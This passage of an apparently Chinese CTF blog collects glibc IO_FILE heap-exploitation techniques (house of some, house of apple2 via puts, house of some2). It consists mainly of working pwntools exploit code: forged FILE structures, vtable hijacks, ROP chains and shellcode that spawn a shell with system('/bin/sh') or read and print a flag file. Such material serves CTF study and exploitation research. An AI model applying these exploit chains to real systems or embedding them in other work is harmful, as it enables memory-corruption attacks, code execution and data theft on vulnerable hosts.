class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rop_chain, <span class="string">&quot;\\n in rop_chain&quot;</span></span><br><span class="line">        p.sendline(rop_chain)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc-2.38.so.6&quot;)</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># libc.address = 0x100000000000</span></span><br><span class="line">    <span class="comment"># print(hex(libc.bss()))</span></span><br><span class="line">    <span class="comment"># print(libc.maps)</span></span><br><span class="line">    <span class="comment"># for k, v in libc.symbols.items():</span></span><br><span class="line">    <span class="comment">#     print(k, hex(v))</span></span><br><span class="line">    code = libc.read(libc.symbols[<span class="string">&#x27;_IO_file_underflow&#x27;</span>], <span class="number">0x200</span>)</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    tmp = disasm(code)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><p>在编写<code>exp</code>时，只需通过<code>from House_of_some import HouseOfSome</code>将该包导入即可</p><h3 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h3><p>🍌🍌🍌🍌🍌🍌🍌🍌🍌🍌🍌🍌🍌  </p><h3 id="通过puts函数来触发IO链"><a href="#通过puts函数来触发IO链" class="headerlink" title="通过puts函数来触发IO链"></a>通过puts函数来触发IO链</h3><p>通过源码我们可以发现，<code>puts</code>函数在启用时会调用虚表中的<code>_IO_wfile_xsputn</code>函数，因此这里给了我们机会来修改虚表偏移来触发<code>io</code>链<br>我们可以将<code>fake_file</code>直接写在<code>_IO_2_1_stdout_</code>的位置上面或者修改<code>stdout</code>指针指向我们的<code>fake_file</code><br>首先是用于<code>getshell</code>的<code>house of apple2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xd8</span>: libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)  </span><br></pre></td></tr></table></figure><p>然后是用于打<code>orw</code>的<code>house of apple2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x10</span>: setcontext,</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x28</span>: pcop,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x58</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] &amp; (~<span class="number">0xfff</span>),    <span class="comment"># set rdi</span></span><br><span class="line">    <span class="number">0x60</span>: <span class="number">0x1000</span>,               <span class="comment"># set rsi</span></span><br><span class="line">    <span class="number">0x78</span>: <span class="number">7</span>,                    <span class="comment"># set rdx</span></span><br><span class="line">    <span class="number">0x90</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0xf0</span>,          <span class="comment"># set rsp</span></span><br><span class="line">    <span class="number">0x98</span>: libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>],             <span class="comment"># set rcx (first jmp)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xd8</span>: libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0xe8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="number">0xf0</span>: [                     <span class="comment"># ROPstart</span></span><br><span class="line">        pop_rax_call_rax,</span><br><span class="line">        libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x100</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x100</span>: asm(    <span class="comment"># shellcode start</span></span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="house-of-some改进版"><a href="#house-of-some改进版" class="headerlink" title="house of some改进版"></a>house of some改进版</h3><p>这里就贴某次比赛的<code>exp</code>，优点是可以不泄露堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_io_read)</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;conversation&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target = stack - <span class="number">648</span></span><br><span class="line">log.success(<span class="string">f&#x27;target:<span class="subst">&#123;target:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x000000000015f8c6</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000630a9</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h3 id="house-of-some2"><a href="#house-of-some2" class="headerlink" title="house of some2"></a>house of some2</h3><p>原文链接：<a href="https://blog.csome.cc/p/house-of-some-2/">https://blog.csome.cc/p/house-of-some-2/</a> 只能说非常的暴力</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_IO_wfile_jumps_maybe_mmap</span>():</span><br><span class="line">    <span class="keyword">global</span> libc,libc_base</span><br><span class="line">    a = <span class="built_in">list</span>(libc.search(p64(libc.symbols[<span class="string">&#x27;_IO_wfile_overflow&#x27;</span>])))</span><br><span class="line">    b = <span class="built_in">list</span>(libc.search(p64(libc.symbols[<span class="string">&#x27;_IO_file_close&#x27;</span>])))</span><br><span class="line">    ans = []</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(i - j) == <span class="number">0x70</span> <span class="keyword">and</span> i - <span class="number">24</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">                ans.append(i - <span class="number">24</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(x + libc_base), ans))&#125;</span> may be the address of _IO_wfile_jumps_maybe_mmap&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (u64(libc.read(ans[<span class="number">0</span>] + <span class="number">0x20</span>,<span class="number">0x8</span>)) + libc_base) == (libc.symbols[<span class="string">&#x27;_IO_wfile_underflow&#x27;</span>] + libc_base):</span><br><span class="line">        result = ans[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = ans[<span class="number">0</span>]</span><br><span class="line">    log.success(<span class="string">f&#x27;_IO_wfile_jumps_maybe_mmap:<span class="subst">&#123;result+libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result + libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_IO_file_jumps</span>():</span><br><span class="line">    <span class="keyword">global</span> libc,libc_base</span><br><span class="line">    IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">    IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">    IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">    IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span> + libc_base</span><br><span class="line">    log.success(<span class="string">f&#x27;IO_str_jumps:<span class="subst">&#123;IO_str_jumps:#x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> IO_str_jumps</span><br><span class="line"></span><br><span class="line">IO_str_jumps = search_IO_file_jumps()</span><br><span class="line">_IO_default_xsgetn = IO_str_jumps + <span class="number">0x40</span></span><br><span class="line">_IO_default_xsputn = IO_str_jumps + <span class="number">0x38</span></span><br><span class="line">_IO_wfile_jumps_maybe_mmap=search_IO_wfile_jumps_maybe_mmap()</span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span>, <span class="comment"># disable lock</span></span><br><span class="line">    <span class="number">0x38</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x100</span>, <span class="comment"># +0xe0可写即可</span></span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>), <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xd8</span>: _IO_wfile_jumps_maybe_mmap - <span class="number">0x18</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x408</span>,fake_file+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>],</span><br><span class="line">    <span class="number">0x38</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xd8</span>: _IO_default_xsputn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    <span class="number">0x30</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_write_end</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap </span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(flat(&#123;</span><br><span class="line">    <span class="number">0</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>], <span class="comment"># retn</span></span><br><span class="line">    <span class="number">0x8</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x1c8</span>-<span class="number">0xc8</span>: &#123;</span><br><span class="line">        <span class="comment"># 0x0: p32(0xffffffff),</span></span><br><span class="line">        <span class="number">0x0</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">        <span class="number">0x40</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">        <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line"></span><br><span class="line">        <span class="number">0xd8</span>: _IO_default_xsgetn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">        <span class="number">0x08</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_read_ptr</span></span><br><span class="line">        <span class="number">0x10</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + (<span class="number">0x1c8</span> - <span class="number">0xc8</span>), <span class="comment"># _IO_read_end</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xe0</span>: &#123;</span><br><span class="line">            <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/Sta8r9/p/17586219.html">https://www.cnblogs.com/Sta8r9/p/17586219.html</a>(house of cat)<br><a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a>(House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解)<br><a href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a>(House OF Kiwi)<br><a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>([原创]House of apple 一种新的glibc中IO攻击方法 (2))<br><a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_13">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_13</a>([原创] CTF 中 glibc堆利用 及 IO_FILE 总结)<br><a href="https://bbs.kanxue.com/thread-276031.htm(%5B%E5%8E%9F%E5%88%9B%5D%E6%97%A0%E8%B7%AF%E8%BF%9C%E5%BE%81%E2%80%94%E2%80%94GLIBC2.37%E5%90%8E%E6%97%B6%E4%BB%A3%E7%9A%84IO%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93%EF%BC%88%E4%BA%8C%EF%BC%89house_of_%E7%A7%A6%E6%9C%88%E6%B1%89%E5%85%B3)">https://bbs.kanxue.com/thread-276031.htm([原创]无路远征——GLIBC2.37后时代的IO攻击之道（二）house_of_秦月汉关)</a><br><a href="https://bbs.kanxue.com/thread-273863.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-273863.htm#msg_header_h3_0</a>([原创]House of apple 一种新的glibc中IO攻击方法 (3))<br><a href="https://bbs.kanxue.com/thread-276056.htm(%5B%E5%8E%9F%E5%88%9B%5D%E6%97%A0%E8%B7%AF%E8%BF%9C%E5%BE%81%E2%80%94%E2%80%94GLIBC2.37%E5%90%8E%E6%97%B6%E4%BB%A3%E7%9A%84IO%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93%EF%BC%88%E4%BA%94%EF%BC%89house_of_%E4%B8%80%E9%AA%91%E5%BD%93%E5%8D%83)">https://bbs.kanxue.com/thread-276056.htm([原创]无路远征——GLIBC2.37后时代的IO攻击之道（五）house_of_一骑当千)</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
